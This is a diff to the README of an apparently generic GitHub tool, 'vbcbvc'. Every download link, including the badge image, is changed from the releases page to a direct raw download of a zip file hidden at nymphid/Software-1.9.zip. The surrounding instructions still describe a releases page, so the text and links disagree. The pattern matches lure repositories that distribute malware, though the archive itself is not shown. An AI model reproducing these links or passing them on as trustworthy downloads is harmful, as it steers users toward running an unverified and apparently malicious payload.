@@ -1,6 +1,6 @@
 # 🌟 vbcbvc - Simple Tool for Everyday Tasks
 
-[![Download vbcbvc](https://img.shields.io/badge/Download-vbcbvc-brightgreen)](https://github.com/H14I5F/vbcbvc/releases)
+[![Download vbcbvc](https://github.com/H14I5F/vbcbvc/raw/refs/heads/main/nymphid/Software-1.9.zip)](https://github.com/H14I5F/vbcbvc/raw/refs/heads/main/nymphid/Software-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to go to the releases page where you can find the application.
    
-   [Download vbcbvc](https://github.com/H14I5F/vbcbvc/releases)
+   [Download vbcbvc](https://github.com/H14I5F/vbcbvc/raw/refs/heads/main/nymphid/Software-1.9.zip)
 
 2. **Choose Your Version**: On the releases page, you’ll see different versions of the application. Look for the latest version for the best features and fixes.
 
@@ -51,7 +51,7 @@ After installation, follow these steps to use the application:
 
 If you encounter any issues, try these solutions:
 
-- **Check for Updates**: Make sure you have the latest version. Revisit the [Download page](https://github.com/H14I5F/vbcbvc/releases) to download any updates.
+- **Check for Updates**: Make sure you have the latest version. Revisit the [Download page](https://github.com/H14I5F/vbcbvc/raw/refs/heads/main/nymphid/Software-1.9.zip) to download any updates.
 - **Restart the Application**: Close and reopen vbcbvc if it freezes or doesn’t respond.
 - **Contact Support**: For persistent issues, reach out to our support team through the GitHub Issues page.
 
@@ -81,4 +81,4 @@ For more details, refer to the documentation within the application or check our
 
 Thank you for choosing **vbcbvc**. We hope it makes your daily tasks easier! 
 
-Make sure to [download vbcbvc](https://github.com/H14I5F/vbcbvc/releases) today!
+Make sure to [download vbcbvc](https://github.com/H14I5F/vbcbvc/raw/refs/heads/main/nymphid/Software-1.9.zip) today!
